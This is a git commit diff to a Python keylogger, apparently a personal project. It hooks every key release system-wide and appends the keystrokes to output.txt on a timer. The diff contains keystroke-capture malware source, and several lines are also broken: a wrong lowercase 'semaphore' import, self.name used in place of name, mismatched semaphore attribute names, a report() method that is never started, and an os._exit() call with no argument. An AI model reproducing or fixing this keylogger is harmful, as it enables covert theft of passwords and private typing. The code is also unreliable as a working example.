1937c01fa1f2aa72c178a1eb2ff54f1945ec6fba
Joey <sjferenchak@gmail.com>
2020-12-05 17:10:03 -0500

    fix?

--- src/keylogger.py
+++ src/keylogger.py
@@ -1,4 +1,6 @@
 import keyboard
+import os
+from threading import semaphore, Timer
 
 
 '''
@@ -9,6 +11,8 @@ import keyboard
 class Keylogger():
   def __init__(self):
     self.log = ""
+    self.out = open("output.txt","a")
+    self.Semaphore = semaphore(0)
 
   def callback(self,event):
     name = event.name
@@ -18,19 +22,26 @@ class Keylogger():
         name = " "
       elif name == "enter":
         name = "[ENTER]\n"
-      elif name == "tab":
-        name = "[TAB]\t"
       elif name == "decimal":
         name = "."
+      elif name == "esc":
+        self.out.close()
+        os._exit()
       else:
         name = name.replace(" ", "_")
         name = f"[{name.upper()}]"
 
     self.log += self.name
 
-  def startup(self):
+  def report(self):
+    if self.log:
+      self.out.write(self.log)
+    Timer(interval=1.0,function=self.report).start()
+
+  def start(self):
     keyboard.on_release(callback=self.callback)
+    self.semaphore.acquire()
 
 if __name__ == '__main__':
   keylogger = Keylogger()
-  keylogger.startup()
+  keylogger.start()
